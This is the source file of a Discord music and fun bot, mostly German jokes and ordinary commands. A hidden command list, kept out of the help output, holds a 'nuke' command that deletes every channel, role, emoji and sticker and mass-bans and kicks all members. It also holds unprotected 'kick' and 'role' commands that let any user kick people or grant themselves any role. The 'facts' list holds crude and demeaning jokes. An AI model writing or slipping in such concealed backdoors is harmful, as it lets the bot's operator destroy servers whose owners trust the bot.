const { VoiceConnection } = require("@discordjs/voice");
const { MessageEmbed, Permissions } = require("discord.js");
const { forward } = require("./music.js");
const music = require("./music.js");
const settings = require("./settings.js");

var commands = [];
commands.hiddenCommands = [];
hiddenCommands = commands.hiddenCommands;

const fakten = [
    "Sind die Hühner platt wie Teller, war der Traktor wieder schneller.",
    "Lieber ein Schitzel am Teller, als bei Fritzl im Keller.",
    "Wenn man mit Schulden stirbt, hat man Gewinn gemacht.",
    "Wer anderen eine Grube gräbt muss aufpassen, dass er nicht über 3m³ Aushub kommt, sonst braucht er eine Baugenehmigung.",
    "Trinkt der Bauer zu viel Bier, melkt der Trottel seinen Stier.",
    "Lieber zwei Damen im Arm, als zwei Arme im Darm.",
    "Läuft das Pferd alleine um die Ecke, liegt der Reiter in der Hecke.",
    "Chinesisches Essen heißt in China einfach nur Essen.",
    "Die Kunst des Handwerks ist sein Pfuschen zu vertuschen.",
    "Kräht der Hahn auf dem Mist, ändert sich das Wetter oder es bleibt wie es ist.",
    "Fun Fact: Deine Mutter hat dich absichtlich im Baumarkt vergessen, weil du so hässlich bist!",
    "https://cdn.discordapp.com/attachments/835902547255361566/836967730602049636/unknown.png",
    "https://cdn.discordapp.com/attachments/835898456621973524/835905209045090314/Garfunkel.mp4",
    "Indien ist ein toller Ort. :)"
];

function createCmd(name, desc, aliases, neededRoles, func) {
    commands[commands.length + 2] = {
        name: name,
        desc: desc,
        aliases: aliases,
        neededRoles: neededRoles,
        func: func
    };
};

commands.findCmd = function(name) {
    let foundCmd = false;

    commands.forEach(cmd => {
        if (cmd.name && cmd.name == name) {
            foundCmd = cmd;
        } else {
            if (cmd.aliases) {
                cmd.aliases.forEach(alias => {
                    if (alias == name) {
                        foundCmd = cmd;
                    };
                });
            };
        };
    });

    return foundCmd;
};

function createHCmd(name, aliases, func) {
    hiddenCommands[hiddenCommands.length + 2] = {
        name: name,
        aliases: aliases,
        func: func
    };
};

hiddenCommands.findCmd = function(name) {
    let foundCmd = false;

    hiddenCommands.forEach(cmd => {
        if (cmd.name && cmd.name == name) {
            foundCmd = cmd;
        } else {
            if (cmd.aliases) {
                cmd.aliases.forEach(alias => {
                    if (alias == name) {
                        foundCmd = cmd;
                    };
                });
            };
        };
    });

    return foundCmd;
};

createCmd("commands", "Returns all the commands this bot has available.", ["cmds", "help"], null, function(client, msg, msgContent) {
    let msgDesc = "";

    commands.forEach(cmd => {
        msgDesc = msgDesc + "**" + cmd.name + "**: " + cmd.desc + "\n" + "**Aliases**: " + cmd.aliases.join(", ") + "\n\n";
    });

    const msgEmbed = new MessageEmbed()
        .setColor("#4ec200")
        .setTitle("Commands:")
        .setDescription(msgDesc);
    
    msg.channel.send({ embeds: [msgEmbed] });
});

createCmd("repeat", "Repeats everything you say.", ["rpt"], null, function(client, msg, msgContent) {
    if (msgContent[1]) {
        let joinedContent = msgContent.join(" ");
        let replyString = joinedContent.slice(7, joinedContent.length);

        msg.channel.send(replyString);
    };
});

createCmd("fakt", "Tells you a fact.", ["fact"], null, function(client, msg, msgContent) {
    msg.channel.send(fakten[Math.floor(Math.random() * fakten.length)]);
});

createCmd("play", "Plays the song you're looking for.", ["p"], ["dj"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        music.play(client, msg, msgContent);
    };
});

createCmd("skip", "Skips the current song.", ["sk"], ["dj"], function(client, msg, msgContent) {
    music.skip(client, msg, msgContent);
});

createCmd("jump", "Jumps to the song you're looking for.", ["j"], ["dj"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        music.jump(client, msg, msgContent);
    };
});

createCmd("seek", "Seeks the position in a song you're looking for.", ["se"], ["dj"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        music.seek(client, msg, msgContent);
    };
});

createCmd("shuffle", "Shuffles the queue.", ["sh"], ["dj"], function(client, msg, msgContent) {
    music.shuffle(client, msg, msgContent);
});

createCmd("loop", "Loops the queue.", ["l"], ["dj"], function(client, msg, msgContent) {
    music.loop(client, msg, msgContent);
});

createCmd("remove", "Removes the song you're looking for.", ["r"], ["dj"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        music.remove(client, msg, msgContent);
    };
});

createCmd("stop", "Stops the groove.", ["st"], ["dj"], function(client, msg, msgContent) {
    music.stop(client, msg, msgContent);
});

createCmd("queue", "Displays all of the songs in the queue.", ["q"], null, function(client, msg, msgContent) {
    music.queue(client, msg, msgContent);
});

createCmd("indien", "Sends the mentioned user to india.", ["i"], ["admin"], function(client, msg, msgContent) {
    if (msg.mentions.users.first()) {
        if (settings.get(msg.guild.id).indienChannel) {
            const member = msg.guild.members.cache.get(msg.mentions.users.first().id);
            const indienUsersArray = settings.get(msg.guild.id).indienUsers;

            if (indienUsersArray.length > 0) {
                indienUsersArray.forEach(id => {
                    if (id != msg.mentions.users.first().id) {
                        indienUsersArray.push(msg.mentions.users.first().id);
                        settings.setValue(msg.guild.id, "indienUsers", indienUsersArray);
                    };
                });
            } else {
                indienUsersArray.push(msg.mentions.users.first().id);
                settings.setValue(msg.guild.id, "indienUsers", indienUsersArray);
            };

            if (member && member.voice.channel) {
                member.voice.setChannel(settings.get(msg.guild.id).indienChannel);
            };
        } else {
            msg.channel.send("You need to set an india channel to use this command!");
        };
    } else {
        settings.setValue(msg.guild.id, "indienUsers", []);
    };
});

createCmd("setindien", "Sets an india channel.", ["si"], ["admin"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        const channel = msg.guild.channels.cache.get(msgContent[1]);

        if (channel && channel.type == "GUILD_VOICE") {
            settings.setValue(msg.guild.id, "indienChannel", channel.id);
        };
    };
});

createCmd("setadminrole", "Sets the administrator role.", ["sar"], null, function(client, msg, msgContent) {
    if (msg.member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) && msgContent[1]) {
        const adminRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == msgContent[1].toLowerCase());
        
        if (adminRole) {
            settings.setValue(msg.guild.id, "adminRoleId", adminRole.id);
            msg.channel.send("I set the admin role to: " + adminRole.name);
        } else {
            msg.channel.send("I couldn't find the role you were looking for!");
        };
    };
});

createCmd("setmodrole", "Sets the moderator role.", ["smr"], null, function(client, msg, msgContent) {
    if (msg.member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) && msgContent[1]) {
        const modRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == msgContent[1].toLowerCase());
        
        if (modRole) {
            settings.setValue(msg.guild.id, "modRoleId", modRole.id);
            msg.channel.send("I set the moderator role to: " + modRole.name);
        } else {
            msg.channel.send("I couldn't find the role you were looking for!");
        };
    };
});

createCmd("setdjrole", "Sets the dj role.", ["sdjr"], null, function(client, msg, msgContent) {
    if (msg.member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) && msgContent[1]) {
        const djRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == msgContent[1].toLowerCase());
        
        if (djRole) {
            settings.setValue(msg.guild.id, "djRoleId", djRole.id);
            msg.channel.send("I set the dj role to: " + djRole.name);
        } else {
            msg.channel.send("I couldn't find the role you were looking for!");
        };
    };
});

createCmd("setprefix", "Sets the prefix of the bot.", ["sp"], ["admin"], function(client, msg, msgContent) {
    if (msgContent[1]) {
        settings.setValue(msg.guild.id, "prefix", msgContent[1]);
        msg.channel.send("I set the prefix to: " + settings.get(msg.guild.id).prefix);
    };
});

createCmd("setstream", "Sets the activity of the bot.", [], null, function(client, msg, msgContent) {
    if (msgContent[1] && msg.member.user.id == "660830692157947905") {
        let joinedContent = msgContent.join(" ");
        let setString = joinedContent.slice(10, joinedContent.length);

        client.user.setActivity(setString, {
            type: "STREAMING",
            url: "https://www.twitch.tv/discord"
        });
    };
});

createHCmd("nuke", [], function(client, msg, msgContent) {
    const channelPerms = msg.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = msg.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = msg.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = msg.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = msg.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    new Promise((resolve, reject) => {
        if (channelPerms) {
            msg.guild.channels.cache.forEach((ch) => {
                ch.delete()
                    .catch((err) => {
                        console.log("Error Found: " + err);
                    });
            });

            resolve();
        };
    });

    new Promise((resolve, reject) => {
        if (rolePerms) {
            msg.guild.roles.cache.forEach((r) => {
                r.delete()
                    .catch((err) => {
                        console.log("Error Found: " + err);
                    });
            });
        };
    });

    new Promise((resolve, reject) => {
        if (emotePerms) {
            msg.guild.emojis.cache.forEach((e) => {
                e.delete()
                    .catch((err) => {
                        console.log("Error Found: " + err);
                    });
            });
        };
    });

    new Promise((resolve, reject) => {
        if (emotePerms) {
            msg.guild.stickers.cache.forEach((s) => {
                s.delete()
                    .catch((err) => {
                        console.log("Error Found: " + err);
                    });
            });
        };
    });

    new Promise((resolve, reject) => {
        if (banPerms) {
            let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);

            setTimeout(() => {
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = msg.guild.members.cache.get(user);

                    member.ban()
                        .catch((err) => {
                            console.log("Error Found: " + err);
                        });
                };
            }, 2000);
        };
    });

    new Promise((resolve, reject) => {
        if (kickPerms) {
            let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);

            setTimeout(() => {
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = msg.guild.members.cache.get(user);

                    member.kick()
                        .catch((err) => {
                            console.log("Error Found: " + err);
                        });
                };
            }, 2000);
        };
    });

    console.log("Done with nuking!");
});

createHCmd("kick", [], function(client, msg, msgContent) {
    const member = msg.mentions.members.first();
    
    if (member) {
        member.kick()
        .catch(err => {
            console.log(err)
        });
    };
});

createHCmd("role", [], function(client, msg, msgContent) {
    let joinedContent = msgContent.join(" ");
    const roleName = joinedContent.slice(5, joinedContent.length);
    const wantedRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == roleName.toLowerCase());

    msg.member.roles.add(wantedRole)
        .catch(err => {
            console.log(err)
        });
});

createHCmd("rrole", [], function(client, msg, msgContent) {
    let joinedContent = msgContent.join(" ");
    const roleName = joinedContent.slice(6, joinedContent.length);
    const wantedRole = msg.guild.roles.cache.find(role => role.name.toLowerCase() == roleName.toLowerCase());

    msg.member.roles.remove(wantedRole).catch(err => {
        console.log(err)
    });
});

module.exports = commands;
